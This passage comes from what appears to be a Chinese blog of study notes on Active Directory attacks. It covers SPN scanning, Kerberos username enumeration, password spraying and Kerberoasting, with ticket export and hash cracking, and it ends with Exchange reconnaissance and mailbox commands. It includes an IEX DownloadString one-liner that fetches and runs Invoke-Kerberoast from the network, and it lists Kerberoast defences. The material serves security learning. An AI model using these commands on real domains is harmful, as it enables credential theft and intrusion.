<h3 id="SPN-扫描">SPN 扫描</h3>
<p><mark>当计算机加入域时，主SPN会自动添加到添加到域的计算机账号的ServicePrincipalName属性中。在安装新的服务后，SPN也会被记录到计算机账号的相应属性中</mark>。</p>
<p>SPN 扫描也叫「扫描 Kerberos 服务实例名称」，在活动目录中发现服务的最佳方法就是 SPN 扫描。</p>
<p><mark>SPN 扫描通过请求特定 SPN 类型的服务主体名称来查找服务，与网络端口相比，SPN 扫描的主要特点是不需要通过连接网络中的每个 IP 地址来检查服务端口，因此不会因触发内网中的安全设备规则而产生大量的告警日志</mark>。</p>
<p>由于 SPN 查询是 Kerberos 票据行为的一部分，所以检测难度较大。</p>
<h4 id="setspn命令">setspn命令</h4>
<p>setspn 是 Windows 自带命令，以下命令可列出域中所有的 SPN 信息</p>
<pre class="line-numbers language-none"><code class="language-none">setspn -T teamssix -Q *&#x2F;*
#setspn -T domain -q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118163008243.png" alt="image-20231118163008243"></p>
<h4 id="Active-Directory-模块">Active Directory 模块</h4>
<p><mark>PowerShell 模块 Active Directory 只在域控上有</mark></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module ActiveDirectory
get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>一个师傅将这个模块导了出来，这样普通主机也可以使用该模块，下载地址：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Microsoft.ActiveDirectory.Management.dll
get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="PowerView脚本">PowerView脚本</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1
Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="Powershell-AD-Recon">Powershell-AD-Recon</h4>
<p>Powershell-AD-Recon 提供了一系列获取服务与服务登录账号和运行服务的主机之间的对应关系的工具，这些服务包括但不限于 MSSQL、Exchange、RDP、WinRM</p>
<p>Powershell-AD-Recon 下载地址：<a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p>
<p>这里注意一下，下载后的文件是没有 .ps1 后缀的，需要自己添加上</p>
<p>Powershell-AD-Recon 工具包里的内容如下：</p>
<pre class="line-numbers language-none"><code class="language-none">Discover-PSInterestingServices  # 查找所有 SPN 服务
Discover-PSMSExchangeServers    # 查找 Exchange 服务器
Discover-PSMSSQLServers         # 查找 MSSQL 服务器
Find-PSServiceAccounts          # 查找服务账户
Get-DomainKerberosPolicy        # 获取域 Kerberos 策略
Get-PSADForestInfo              # 获取域森林信息
Get-PSADForestqInfo             # 获取域森林 KRBTGT 信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由于 SPN 是通过 LDAP 协议向域控制器进行查询的，因此RedTeam<mark>需要获得一个普通的域用户权限才可以进行 SPN 扫描</mark>。</p>
<p>将 PowerShell 脚本导入并执行，以 MSSQL 服务为例</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSMSSQLServers.ps1
Discover-PSMSSQLServers
或者
PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSMSSQLServers.ps1;Discover-PSMSSQLServers&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>扫描域中所有的 SPN 信息</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSInterestingServices.ps1
Discover-PSInterestingServices
或者
PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118162454223.png" alt="image-20231118162454223"></p>
<h4 id="kerberoast">kerberoast</h4>
<p>kerberoast 工具包里的 GetUserSPNs.ps1，可以帮助我们<mark>发现仅与用户帐户相关联的服务</mark>。</p>
<p>kerberoast 下载地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;GetUserSPNs.ps1
或者
PowerShell -Exec bypass -File GetUserSPNs.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>kerberoast 工具包里的 GetUserSPNs.vbs 也能实现相同的功能</p>
<pre class="line-numbers language-none"><code class="language-none">cscript.exe GetUserSPNs.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="PowerShellery">PowerShellery</h4>
<p>PowerShellery 工具包里包含了 Get-SPN，可以为各种服务收集 SPN</p>
<p>PowerShellery 下载地址：<a target="_blank" rel="noopener" href="https://github.com/nullbind/Powershellery">https://github.com/nullbind/Powershellery</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1
Get-SPN -type service -search *
或者
PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search *&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果也可以转换为表格的形式，以便于浏览</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1
Get-SPN -type service -search * -List yes
或者
PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search * -List yes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>另外一个 Get-DomainSpn.psm1 脚本可以用来获取 UserSID、服务和实际用户</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-DomainSpn.psm1
Get-DomainSpn
或者
PowerShell -Exec bypass -C &quot;Import-Module .\Get-DomainSpn.psm1;Get-DomainSpn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Impacket">Impacket</h4>
<p>Impacket 下载地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p>上面的工具都是在域内的机器里扫描 SPN 的，<mark>利用 impacket 工具包下的 <a target="_blank" rel="noopener" href="http://GetUserSPNs.py">GetUserSPNs.py</a> 可以在非域主机中扫描目标的 SPN</mark></p>
<pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118163620234.png" alt="image-20231118163620234"></p>
<h3 id="Kerberos-协议的利用">Kerberos 协议的利用</h3>
<h4 id="用户名枚举">用户名枚举</h4>
<p>当用户名输入正确或错误时，Kerberos 协议所返回的状态码是不同的，利用这一特性可以进行用户名枚举，这里使用 Kerbrute 工具进行演示。</p>
<p>Kerbrute下载地址：<a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p>
<pre class="line-numbers language-none"><code class="language-none">kerbrute userenum --dc 192.168.7.7 -d teamssix.com users.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120195552392.png" alt="image-20231120195552392"></p>
<h4 id="密码喷洒">密码喷洒</h4>
<p>密码喷洒和用户名枚举原理一样，而且使用 Kerberos 协议对 Windows 密码进行暴力破解比其他方法要快得多，并且更加隐蔽，因为 Kerberos 身份验证即使失败也不会触发 4625 登录失败事件。</p>
<p>这里同样使用 Kerbrute 工具进行演示：</p>
<pre class="line-numbers language-none"><code class="language-none">kerbrute passwordspray --dc 192.168.7.7 -d teamssix.com users.txt 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120200328423.png" alt="image-20231120200328423"></p>
<h4 id="kerberoast-2">kerberoast</h4>
<p>kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。</p>
<p>当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，<mark>RedTeam 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RedTeam 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码</mark>。</p>
<p>在域环境中，攻击者会通过Kerberast使用普通用户权限在活动目录中将计算机服务账号的凭据提取出来。<mark>因为在使用该方法时，大多数操作都是离线完成的，不会向目标系统发送任何信息，所以不会引起安全设备的报警</mark>。又因为大多数网络的域环境策略不够严格（如：没有给计算机服务账号设置密码过期时间；计算机服务账户的权限过高；计算机服务账号的密码与普通域用户账号密码相同），所以计算机服务账户的密码很容易受到Kerberoast攻击的影响。</p>
<p>kerberoast 的利用思路：</p>
<ol>
<li>
<p>查询 SPN 寻找在 Users 下并且是高权限域用户的服务</p>
</li>
<li>
<p>请求并导出 TGS</p>
</li>
<li>
<p>对 TGS 进行爆破</p>
</li>
</ol>
<p>这里以 MSSQL 服务为例，并尝试破解该服务的票据</p>
<p>手动注册 SPN</p>
<pre class="line-numbers language-none"><code class="language-none">setspn -A MSSQLSvc&#x2F;DBSRV.teamssix.com:1433 test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看用户所对应的 SPN</p>
<pre class="line-numbers language-none"><code class="language-none">setspn -L teamssix.com\test

#如果要查看所有注册的SPN，则使用一下命令
setspn -T domain -q *&#x2F;*

#也可以使用 Kerberoast 工具包中的 GetUserSPNs.ps1脚本 查询SPN
.&#x2F;GetUserSPNs.ps1
#PowerShell -Exec bypass -File GetUserSPNs.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120202004201.png" alt="image-20231120202004201"></p>
<p>还可以使用 adsiedit.msc 查看用户 SPN 及其他高级属性</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118183414633.png" alt="image-20231118183414633"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118183540011.png" alt="image-20231118183540011"></p>
<p>为用户配置指定服务的登录权限，gpedit.msc 打开本地组策略编辑器，找到以下路径</p>
<pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\用户权限分配\作为服务登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>因为 Kerberos 协议的默认加密方式是 AES256_HMAC，而通过 <a target="_blank" rel="noopener" href="http://tgsreperack.py">tgsreperack.py</a> 脚本无法破解该加密方式，因此我们可以通过组策略将加密方式设置为 RC_HMAC_MD5</p>
<p>在本地组策略编辑器中，找到以下路径，将加密方式设置为 RC4_HMAC_MD5</p>
<pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\安全选项\网络安全：配置 Kerberos 允许的加密类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>请求指定 SPN 的服务票据</p>
<pre class="line-numbers language-none"><code class="language-none">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DBSRV.teamssix.com&#39;
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>或者请求所有服务的服务票据</p>
<pre class="line-numbers language-none"><code class="language-none">Add-Type -AssemblyName System.IdentityModel  
setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>可以使用 klist 查看本地缓存的票证，看看有没有新的票据</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118194748354.png" alt="image-20231118194748354"></p>
<p>之后在 mimikatz 中执行如下命令，将内存中的票据导出</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::list &#x2F;export
#票据会导出在当前目录下的kirbi文件中，加密方式为RC4_HMAC_MD5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120202402453.png" alt="image-20231120202402453"></p>
<p>也可以不使用 mimikatz，使用 powershell 脚本导出支持 hashcat 破解的格式</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;EmpireProject&#x2F;Empire&#x2F;6ee7e036607a62b0192daed46d3711afc65c3921&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者使用 Rubeus 获取票据</p>
<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>也可以使用 impacket 获取票据</p>
<pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118195115590.png" alt="image-20231118195115590"></p>
<p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 <a target="_blank" rel="noopener" href="http://tgsreperack.py">tgsreperack.py</a> 脚本破解票据的 NTLM Hash</p>
<p>Kerberoast 脚本下载地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
<pre class="line-numbers language-none"><code class="language-none">python2 tgsreperack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231120202446550.png" alt="image-20231120202446550"></p>
<p>或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118195956641.png" alt="image-20231118195956641"></p>
<p>针对Kerberoast攻击，有如下防范建议：</p>
<ul>
<li>确保服务账号密码长度超过25位；确保密码的随机性；定期修改服务账号的密码</li>
<li>如果攻击者无法将默认的AES256_HMAC加密方式更改为RC4_HMAC_MD5，就无法使用tgsrepcrack。py来破解密码【攻击者可以通过嗅探的方法抓取 Kerberos TGS 票据。因此，如果强制使用 AES_256_HMAC 方式对 Kerberos 票据进行加密，那么，即使攻击者获取了Kerberos票据，也无法将其破解，从而保证了活动目录的安全性】</li>
<li>许多服务账户在内网中被分配了过高的权限，且密码强度通常较差。攻击者很可能通过破解票据的密码，从域用户权限提升升到域管理员权限。因此，应该对服务账户的权限进行话当的配置，并提高密码的强度</li>
<li>在进行日志审计时，可以重点关注ID为4769（请求Kerberos服务票据）的事件。如果有过多的4769日志，应该进一步检查系系统中是否存在恶意行为</li>
</ul>
<h2 id="Exchange邮件服务器利用">Exchange邮件服务器利用</h2>
<h3 id="Exchange邮件服务器基本介绍">Exchange邮件服务器基本介绍</h3>
<p>Exdhane是微软出品的电子邮件服务组件，是一个消息与协作系统。Exchange 在学校和企业中常常作为主要的电子邮件系统使用。Exchange的主要版本有Exchange 2003、Exchange 2007、Exchange 2010、Exchange 2013、Exchange 2016、Exchange 2019。</p>
<p><mark>Exchange服务器可以以本地化的形式部署。也可以以Exchange Online的方式，将Exchange服务器托管在微软云端</mark>。Exchange 提供了极强的可扩展性、可靠性、可用性，以及极高的处理性能与安全性能。同时，Exchange 与活动目录、域服务、全局编排目录及微软的其他相关服务和组件有着紧密的联系。</p>
<p><mark>在大型企业中，大多数办公业务都是通过电子邮件系统完成的，电子邮件中可能包含大量的源码、企业内部通讯录、明文密码，敏感业务登录地址及可以从外网访问内网的VPN账户和密码等信息</mark>。因此。在对服务器进行安全议置时，定要及时更新Exchange软件的安全补丁和Exchange服务器的安全补丁，有效降低Exchange沦陷情况的发生概率。<mark>Exchange支持PowerShell对其进行本地或远程操作</mark>，这一方面方便了运维人员对Exchange的管理和配置，另一方面为攻击者对Exchange进行恶意操作创造了条件。</p>
<h4 id="Exchange邮件服务器角色">Exchange邮件服务器角色</h4>
<p>通过划分不同的服务器角色(使它们能执行属于自己的组件和服务)，以及为这些角色设置依存关系，Exchange将电子邮件处理变成了一个强大、丰富、稳定而又复杂的过程。<mark>Exchange在逻辑上分为三层，分别是网络层Network Layer)、目录层(Dretory Layer)、消息层(Messging Layer)。服务器角色处在消息层</mark>。</p>
<p>以Exchange Server 2010版本为例，Exchange Server 2010包含五个服务器角色，分别是邮箱服务器（mailbox server）、集线传输服务器（hub transport server）、客户端访问服务器（client access server）、边缘传输服务器（edge transport server）、统一消息服务器（unified messaging server），除了边缘传输服务器以外其他角色都可以在同一台主机上进行部署添加，<mark>其中邮箱服务器、集线传输服务器、客户端访问服务器是核心服务器角色，部署这三个角色就能提供基本的邮件处理功能</mark>。下面对这五个服务器角色进行说明：</p>
<ul>
<li>
<p>邮件服务器</p>
<ul>
<li>该角色是提供托管邮箱、公共文件夹以及相关的消息数据（如地址列表）的后端组件，是必选的服务器角色。</li>
</ul>
</li>
<li>
<p>客户端访问服务器</p>
<ul>
<li>
<p>接收和处理来自于不同客户端的请求的中间层服务器角色，该角色服务器提供了对使用不同协议进行访问的支持，每个 Exchange 环境中至少需要部署一个客户端访问服务器，客户端访问服务器提供了对以下不同接口访问 Exchange 服务器的处理。</p>
<pre class="line-numbers language-none"><code class="language-none">MAPI访问
POP3和IMAP4访问
Outlook Web App访问（OWA）
Outlook Anywhere访问
Autodiscover自动发现服务
可用性服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
</li>
<li>
<p>集线传输服务器</p>
<ul>
<li>或称中心传输服务器，该服务器角色的核心服务就是 Microsoft Exchange Transport，负责处理 Mail Flow（这又是Exchange中的一大知识点，Exchange 管理员需要通过 MailFlow 实现邮件出站与进站配置）、对邮件进行路由、以及在 Exchange 组织中进行分发，该服务器角色处理所有发往属于本地邮箱的邮件和发往外部邮箱的邮件，并确保邮件发送者和接收者的地址被正确解析并执行特定策略（如邮件地址过滤、内容过滤、格式转换等），该服务器角色相当于一个邮件传输的中继站点，每个 Exchange 环境中至少需要部署一个集线传输服务器。</li>
</ul>
</li>
<li>
<p>统一消息服务器</p>
<ul>
<li>将专用交换机（private branch exchange/PBX） 和 Exchange Server 集成在一起，以允许邮箱用户可以在邮件中发送存储语音消息和传真消息，可选角色。</li>
</ul>
</li>
<li>
<p>边缘消息服务器</p>
<ul>
<li>该服务器角色作为专用服务器可以用于路由发往内部或外部的邮件，通常部署于网络边界并用于设置安全边界。其接受来自内部组织的邮件和来自外部可信服务器的邮件，然后应用特定的反垃圾邮件、反病毒策略，最后将通过策略筛选的邮件路由到内部的集线传输服务器，可选角色。</li>
</ul>
</li>
</ul>
<p><mark>在 Exchange Server 2013 及以后的版本中，服务器角色精简为三个，分别是邮箱服务器、客户端访问服务器和边缘传输服务器，其中邮箱服务器角色和客户端访问服务器角色通常被安装在同一台服务器中</mark>。</p>
<h4 id="客户端-远程访问接口和协议">客户端/远程访问接口和协议</h4>
<p>邮件通信分为邮件发送和邮件接收，<mark>其中邮件发送使用统一的通信协议，即SMTP，而邮件的收取则有多种协议标准，如由早期的POP发展至今的POP3，如今使用广泛的IMAP</mark>，Exchange开发了私有的MAPI协议用于收取邮件，较新版本的Outlook通常使用MAPI与Exchange进行交互，除此之外早期的Outlook还使用称为Outlook Anywhere的RPC交互</p>
<p>下面介绍Exchange提供支持的访问接口和协议：</p>
<ul>
<li>
<p>OWA（Outlook Web App）</p>
<ul>
<li>客户端登录使用，地址通常为 <a target="_blank" rel="noopener" href="http://doamin/owa/">http://DOAMIN/owa/</a></li>
<li>页面如下<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119134916596.png" alt="image-20231119134916596"></li>
</ul>
</li>
<li>
<p>ECP（Exchange Administrative Center）</p>
<ul>
<li>管理中心，管理员用于管理组织中的 Exchange 的 Web 控制台，地址通常为 <a target="_blank" rel="noopener" href="http://domain/ecp/">http://DOMAIN/ecp/</a></li>
<li>页面如下<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119134957183.png" alt="image-20231119134957183"></li>
</ul>
</li>
<li>
<p>Outlook Anywhere（RPC-over-HTTP，RPC/HTTP）<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119135232845.png" alt="image-20231119135232845"></p>
</li>
<li>
<p>MAPI（MAPI-over-HTTP，MAPI/HTTP）<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119135310438.png" alt="image-20231119135310438"></p>
</li>
<li>
<p>Exchange ActiveSync（EAS，XML/HTTP）<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119135410380.png" alt="image-20231119135410380"></p>
</li>
<li>
<p>Exchange Web Service（EWS，SOAP-over-HTTP）<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119135439769.png" alt="image-20231119135439769"></p>
</li>
</ul>
<h3 id="Exchange-服务发现">Exchange 服务发现</h3>
<p>Exchange作为一个运行在计算机系统中的、为用户提供服务的应用，必然会开放相应的端口(供多个服务和功能组件实现相互依赖与协调)。所以，通过端口扫描就能发现内网或公网中开放的Exchange 服务器。端口特征如下：</p>
<ul>
<li>25 端口 SMTP 指纹显示 Exchange smtpd</li>
<li>80 端口为 iis</li>
<li>443 端口开放</li>
</ul>
<p>但是注意两点：</p>
<ul>
<li>不同的服务与端口可能取决于服务器所安装的角色、服务器进行的配置、以及网络环境与访问控制的安全配置等（所以具体开放的端口或服务取决于服务器角色、服务器进行的配置、以及网络环境与访问控制的安全配置等）</li>
<li>使用Nmap端口扫描的方法寻找Exchange服务器，需要与主机进行交互，产生大量的通信流量，造成IDS报警，并在目标服务器中留下大量的日志。蓝队人员可以关注报警信息、经常查看日志，就可以发现网络系统中存在的异常</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#基于端口扫描发现，这里使用nmap
nmap -A -O -sV 10.1.1.23
#在安装Exchange 时，SPN就被注册在活动目录中了。在域环境中，可以通过SPN来发现Exchange服务。
#获取SPN记录的方法很多，可以使用PowerShell脚本获取，也可以使用Windows自带的setspn命令获取，这里使用setspn
#在域内的一台工作机上，通过setspn查询
setspn -T labtest.com -F -Q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119151827056.png" alt="image-20231119151827056"></p>
<h3 id="Exchange-的基本操作">Exchange 的基本操作</h3>
<blockquote>
<p>在 Exchange 服务器上的 PowerShell 里进行以下操作</p>
</blockquote>
<p>既然Exchange是一个电子邮件系统，那么其中必然存在数据库。Exchange 数据库的后缀为“.edb&quot;，存储在Exchange服务器上。通过Exchange发送、接收、存储的邮件，都会存储在Exchange的数据库中。为了保证可用性，Exchange 的运行一般需要两台以上的服务器。使用PowerShell可以查看Exchange数据库的信息。</p>
<p>将 Exchange 管理单元添加到当前会话中</p>
<pre class="line-numbers language-none"><code class="language-none">add-pssnapin microsoft.exchange*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>注意，这一步是以下所有操作的前提</p>
</blockquote>
<p>查看邮件数据库</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -server &quot;dc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119151703123.png" alt="image-20231119151703123"></p>
<p>查询数据库的物理路径</p>
<pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -Identity &#39;Mailbox Database 0761701514&#39; | Format-List Name,EdbFilePath,LogFolderPath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>获取所有用户的邮件地址</p>
<pre class="line-numbers language-none"><code class="language-none">Get-Mailbox | Format-table Name,WindowsEmailAddress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看指定用户的邮箱使用信息</p>
<pre class="line-numbers language-none"><code class="language-none">Get-Mailboxstatistics -Identity Administrator | Select Dispayname,ItemCount,TotalItemSize,TotalTimeSize,LastLogonTime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231119151945285.png" alt="image-20231119151945285"></p>
<p>获取用户邮箱中的邮件数量及用户的最后登录时间，通过该命令还可以列出那些用户未登录过Exchange邮件系统</p>
<pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -ResultSize Unlimited | Get-Mailboxstatistics | Sort-Object TotalItemSize -Descend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Exchange导出指定的电子邮箱">Exchange导出指定的电子邮箱</h3>
<p>Exchange邮件的后缀为“.pst”，Exchange Server 2007 中需要使用 ExportMailBox 命令，在 Exchange Server 2010 SP1 及以后的版本中可以使用图形化界面导出，也可以使用 PowerShell</p>
<p><mark>如果想要导出 PTS 格式的邮件文件，则需要为能够操作的Powershell的用户配置邮箱导入/导出权限</mark>。</p>
<h4 id="配置用户的导入导出权限">配置用户的导入导出权限</h4>
<p>查看用户权限</p>
<pre class="line-numbers language-none"><code class="language-none">Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot;
#Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
